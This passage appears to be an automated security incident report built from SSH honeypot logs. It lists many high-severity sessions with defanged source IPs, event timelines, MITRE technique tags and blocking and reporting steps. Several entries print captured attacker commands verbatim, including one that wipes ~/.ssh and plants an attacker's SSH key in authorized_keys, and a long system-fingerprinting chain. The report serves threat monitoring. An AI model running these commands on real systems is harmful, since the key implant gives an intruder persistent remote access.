| `2026-08-04 13:45:31` | `cowrie.command.input` |
| `2026-08-04 13:45:31` | `cowrie.command.input` |
| `2026-08-04 13:45:31` | `cowrie.command.input` |
| `2026-08-04 13:45:31` | `cowrie.command.input` |
| `2026-08-04 13:45:31` | `cowrie.command.success` |
| `2026-08-04 13:45:31` | `cowrie.command.input` |
| `2026-08-04 13:45:31` | `cowrie.command.input` |
| `2026-08-04 13:45:31` | `cowrie.command.input` |
| `2026-08-04 13:45:31` | `cowrie.command.input` |
| `2026-08-04 13:45:32` | `cowrie.log.closed` |
| `2026-08-04 13:45:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d972fe05eda8

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:45 |
| **Last Seen** | 2026-08-04 13:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:45:45` | `cowrie.session.connect` |
| `2026-08-04 13:45:45` | `cowrie.client.version` |
| `2026-08-04 13:45:45` | `cowrie.client.kex` |
| `2026-08-04 13:45:45` | `cowrie.login.success` |
| `2026-08-04 13:45:46` | `cowrie.session.params` |
| `2026-08-04 13:45:46` | `cowrie.command.input` |
| `2026-08-04 13:45:46` | `cowrie.log.closed` |
| `2026-08-04 13:45:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2143089d6a8e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:47 |
| **Last Seen** | 2026-08-04 13:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:47:04` | `cowrie.session.connect` |
| `2026-08-04 13:47:04` | `cowrie.client.version` |
| `2026-08-04 13:47:05` | `cowrie.client.kex` |
| `2026-08-04 13:47:06` | `cowrie.login.success` |
| `2026-08-04 13:47:08` | `cowrie.session.params` |
| `2026-08-04 13:47:08` | `cowrie.command.input` |
| `2026-08-04 13:47:08` | `cowrie.command.input` |
| `2026-08-04 13:47:08` | `cowrie.command.input` |
| `2026-08-04 13:47:08` | `cowrie.command.input` |
| `2026-08-04 13:47:08` | `cowrie.command.input` |
| `2026-08-04 13:47:08` | `cowrie.command.success` |
| `2026-08-04 13:47:08` | `cowrie.command.input` |
| `2026-08-04 13:47:08` | `cowrie.command.input` |
| `2026-08-04 13:47:08` | `cowrie.command.input` |
| `2026-08-04 13:47:08` | `cowrie.command.input` |
| `2026-08-04 13:47:09` | `cowrie.log.closed` |
| `2026-08-04 13:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ae14634d40d

| Field | Detail |
|---|---|
| **Source IP** | `185.74.7[.]77` |
| **First Seen** | 2026-08-04 13:47 |
| **Last Seen** | 2026-08-04 13:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:47:12` | `cowrie.session.connect` |
| `2026-08-04 13:47:12` | `cowrie.client.version` |
| `2026-08-04 13:47:12` | `cowrie.client.kex` |
| `2026-08-04 13:47:13` | `cowrie.login.success` |
| `2026-08-04 13:47:14` | `cowrie.session.params` |
| `2026-08-04 13:47:14` | `cowrie.command.input` |
| `2026-08-04 13:47:14` | `cowrie.command.failed` |
| `2026-08-04 13:47:14` | `cowrie.log.closed` |
| `2026-08-04 13:47:15` | `cowrie.session.params` |
| `2026-08-04 13:47:15` | `cowrie.command.input` |
| `2026-08-04 13:47:15` | `cowrie.session.file_download` |
| `2026-08-04 13:47:15` | `cowrie.log.closed` |
| `2026-08-04 13:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.7[.]77` to AbuseIPDB if not already reported
- [ ] Block `185.74.7[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27acac74e024

| Field | Detail |
|---|---|
| **Source IP** | `185.74.7[.]77` |
| **First Seen** | 2026-08-04 13:47 |
| **Last Seen** | 2026-08-04 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:47:15` | `cowrie.session.connect` |
| `2026-08-04 13:47:15` | `cowrie.client.version` |
| `2026-08-04 13:47:15` | `cowrie.client.kex` |
| `2026-08-04 13:47:16` | `cowrie.login.success` |
| `2026-08-04 13:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.7[.]77` to AbuseIPDB if not already reported
- [ ] Block `185.74.7[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5587ae2059a6

| Field | Detail |
|---|---|
| **Source IP** | `185.74.7[.]77` |
| **First Seen** | 2026-08-04 13:47 |
| **Last Seen** | 2026-08-04 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:47:16` | `cowrie.session.connect` |
| `2026-08-04 13:47:16` | `cowrie.client.version` |
| `2026-08-04 13:47:17` | `cowrie.client.kex` |
| `2026-08-04 13:47:17` | `cowrie.login.success` |
| `2026-08-04 13:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.7[.]77` to AbuseIPDB if not already reported
- [ ] Block `185.74.7[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-957d346dc6a4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:47 |
| **Last Seen** | 2026-08-04 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:47:28` | `cowrie.session.connect` |
| `2026-08-04 13:47:28` | `cowrie.client.version` |
| `2026-08-04 13:47:28` | `cowrie.client.kex` |
| `2026-08-04 13:47:28` | `cowrie.login.success` |
| `2026-08-04 13:47:29` | `cowrie.session.params` |
| `2026-08-04 13:47:29` | `cowrie.command.input` |
| `2026-08-04 13:47:29` | `cowrie.log.closed` |
| `2026-08-04 13:47:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aed35af6b9f1

| Field | Detail |
|---|---|
| **Source IP** | `123.253.162[.]254` |
| **First Seen** | 2026-08-04 13:48 |
| **Last Seen** | 2026-08-04 13:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:48:16` | `cowrie.session.connect` |
| `2026-08-04 13:48:16` | `cowrie.client.version` |
| `2026-08-04 13:48:16` | `cowrie.client.kex` |
| `2026-08-04 13:48:17` | `cowrie.login.success` |
| `2026-08-04 13:48:18` | `cowrie.session.params` |
| `2026-08-04 13:48:18` | `cowrie.command.input` |
| `2026-08-04 13:48:18` | `cowrie.command.failed` |
| `2026-08-04 13:48:19` | `cowrie.log.closed` |
| `2026-08-04 13:48:19` | `cowrie.session.params` |
| `2026-08-04 13:48:19` | `cowrie.command.input` |
| `2026-08-04 13:48:20` | `cowrie.session.file_download` |
| `2026-08-04 13:48:20` | `cowrie.log.closed` |
| `2026-08-04 13:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.253.162[.]254` to AbuseIPDB if not already reported
- [ ] Block `123.253.162[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f97ddc213696

| Field | Detail |
|---|---|
| **Source IP** | `123.253.162[.]254` |
| **First Seen** | 2026-08-04 13:48 |
| **Last Seen** | 2026-08-04 13:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:48:20` | `cowrie.session.connect` |
| `2026-08-04 13:48:20` | `cowrie.client.version` |
| `2026-08-04 13:48:20` | `cowrie.client.kex` |
| `2026-08-04 13:48:21` | `cowrie.login.success` |
| `2026-08-04 13:48:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.253.162[.]254` to AbuseIPDB if not already reported
- [ ] Block `123.253.162[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bb07734b436

| Field | Detail |
|---|---|
| **Source IP** | `123.253.162[.]254` |
| **First Seen** | 2026-08-04 13:48 |
| **Last Seen** | 2026-08-04 13:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:48:21` | `cowrie.session.connect` |
| `2026-08-04 13:48:21` | `cowrie.client.version` |
| `2026-08-04 13:48:22` | `cowrie.client.kex` |
| `2026-08-04 13:48:23` | `cowrie.login.success` |
| `2026-08-04 13:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.253.162[.]254` to AbuseIPDB if not already reported
- [ ] Block `123.253.162[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47c67ebdc3cb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:48 |
| **Last Seen** | 2026-08-04 13:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:48:40` | `cowrie.session.connect` |
| `2026-08-04 13:48:40` | `cowrie.client.version` |
| `2026-08-04 13:48:40` | `cowrie.client.kex` |
| `2026-08-04 13:48:41` | `cowrie.login.success` |
| `2026-08-04 13:48:43` | `cowrie.session.params` |
| `2026-08-04 13:48:43` | `cowrie.command.input` |
| `2026-08-04 13:48:43` | `cowrie.command.input` |
| `2026-08-04 13:48:43` | `cowrie.command.input` |
| `2026-08-04 13:48:43` | `cowrie.command.input` |
| `2026-08-04 13:48:43` | `cowrie.command.input` |
| `2026-08-04 13:48:43` | `cowrie.command.success` |
| `2026-08-04 13:48:43` | `cowrie.command.input` |
| `2026-08-04 13:48:43` | `cowrie.command.input` |
| `2026-08-04 13:48:43` | `cowrie.command.input` |
| `2026-08-04 13:48:43` | `cowrie.command.input` |
| `2026-08-04 13:48:43` | `cowrie.log.closed` |
| `2026-08-04 13:48:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dda45efe085

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:49 |
| **Last Seen** | 2026-08-04 13:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:49:09` | `cowrie.session.connect` |
| `2026-08-04 13:49:09` | `cowrie.client.version` |
| `2026-08-04 13:49:09` | `cowrie.client.kex` |
| `2026-08-04 13:49:10` | `cowrie.login.success` |
| `2026-08-04 13:49:10` | `cowrie.session.params` |
| `2026-08-04 13:49:10` | `cowrie.command.input` |
| `2026-08-04 13:49:10` | `cowrie.log.closed` |
| `2026-08-04 13:49:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ace78cd423f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:50 |
| **Last Seen** | 2026-08-04 13:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:50:15` | `cowrie.session.connect` |
| `2026-08-04 13:50:15` | `cowrie.client.version` |
| `2026-08-04 13:50:15` | `cowrie.client.kex` |
| `2026-08-04 13:50:16` | `cowrie.login.success` |
| `2026-08-04 13:50:17` | `cowrie.session.params` |
| `2026-08-04 13:50:17` | `cowrie.command.input` |
| `2026-08-04 13:50:17` | `cowrie.command.input` |
| `2026-08-04 13:50:17` | `cowrie.command.input` |
| `2026-08-04 13:50:17` | `cowrie.command.input` |
| `2026-08-04 13:50:17` | `cowrie.command.input` |
| `2026-08-04 13:50:17` | `cowrie.command.success` |
| `2026-08-04 13:50:17` | `cowrie.command.input` |
| `2026-08-04 13:50:17` | `cowrie.command.input` |
| `2026-08-04 13:50:17` | `cowrie.command.input` |
| `2026-08-04 13:50:17` | `cowrie.command.input` |
| `2026-08-04 13:50:18` | `cowrie.log.closed` |
| `2026-08-04 13:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d8c08939283

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:50 |
| **Last Seen** | 2026-08-04 13:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:50:50` | `cowrie.session.connect` |
| `2026-08-04 13:50:50` | `cowrie.client.version` |
| `2026-08-04 13:50:50` | `cowrie.client.kex` |
| `2026-08-04 13:50:50` | `cowrie.login.success` |
| `2026-08-04 13:50:51` | `cowrie.session.params` |
| `2026-08-04 13:50:51` | `cowrie.command.input` |
| `2026-08-04 13:50:51` | `cowrie.log.closed` |
| `2026-08-04 13:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05a63acb8d00

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:51 |
| **Last Seen** | 2026-08-04 13:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:51:50` | `cowrie.session.connect` |
| `2026-08-04 13:51:50` | `cowrie.client.version` |
| `2026-08-04 13:51:50` | `cowrie.client.kex` |
| `2026-08-04 13:51:51` | `cowrie.login.success` |
| `2026-08-04 13:51:53` | `cowrie.session.params` |
| `2026-08-04 13:51:53` | `cowrie.command.input` |
| `2026-08-04 13:51:53` | `cowrie.command.input` |
| `2026-08-04 13:51:53` | `cowrie.command.input` |
| `2026-08-04 13:51:53` | `cowrie.command.input` |
| `2026-08-04 13:51:53` | `cowrie.command.input` |
| `2026-08-04 13:51:53` | `cowrie.command.success` |
| `2026-08-04 13:51:53` | `cowrie.command.input` |
| `2026-08-04 13:51:53` | `cowrie.command.input` |
| `2026-08-04 13:51:53` | `cowrie.command.input` |
| `2026-08-04 13:51:53` | `cowrie.command.input` |
| `2026-08-04 13:51:53` | `cowrie.log.closed` |
| `2026-08-04 13:51:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51dcbc79ed82

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-04 13:52 |
| **Last Seen** | 2026-08-04 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:52:15` | `cowrie.session.connect` |
| `2026-08-04 13:52:15` | `cowrie.client.version` |
| `2026-08-04 13:52:16` | `cowrie.client.kex` |
| `2026-08-04 13:52:16` | `cowrie.login.success` |
| `2026-08-04 13:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4c4df01045d

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-04 13:52 |
| **Last Seen** | 2026-08-04 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:52:16` | `cowrie.session.connect` |
| `2026-08-04 13:52:16` | `cowrie.client.version` |
| `2026-08-04 13:52:16` | `cowrie.client.kex` |
| `2026-08-04 13:52:17` | `cowrie.login.success` |
| `2026-08-04 13:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb07ca29548

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:52 |
| **Last Seen** | 2026-08-04 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:52:32` | `cowrie.session.connect` |
| `2026-08-04 13:52:32` | `cowrie.client.version` |
| `2026-08-04 13:52:32` | `cowrie.client.kex` |
| `2026-08-04 13:52:32` | `cowrie.login.success` |
| `2026-08-04 13:52:33` | `cowrie.session.params` |
| `2026-08-04 13:52:33` | `cowrie.command.input` |
| `2026-08-04 13:52:33` | `cowrie.log.closed` |
| `2026-08-04 13:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fbce9f678b0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:53 |
| **Last Seen** | 2026-08-04 13:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:53:29` | `cowrie.session.connect` |
| `2026-08-04 13:53:29` | `cowrie.client.version` |
| `2026-08-04 13:53:29` | `cowrie.client.kex` |
| `2026-08-04 13:53:29` | `cowrie.login.success` |
| `2026-08-04 13:53:31` | `cowrie.session.params` |
| `2026-08-04 13:53:31` | `cowrie.command.input` |
| `2026-08-04 13:53:31` | `cowrie.command.input` |
| `2026-08-04 13:53:31` | `cowrie.command.input` |
| `2026-08-04 13:53:31` | `cowrie.command.input` |
| `2026-08-04 13:53:31` | `cowrie.command.input` |
| `2026-08-04 13:53:31` | `cowrie.command.success` |
| `2026-08-04 13:53:31` | `cowrie.command.input` |
| `2026-08-04 13:53:31` | `cowrie.command.input` |
| `2026-08-04 13:53:31` | `cowrie.command.input` |
| `2026-08-04 13:53:31` | `cowrie.command.input` |
| `2026-08-04 13:53:32` | `cowrie.log.closed` |
| `2026-08-04 13:53:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e9a6d6b52fa

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 13:54 |
| **Last Seen** | 2026-08-04 13:54 |
| **Session Duration** | 3s |
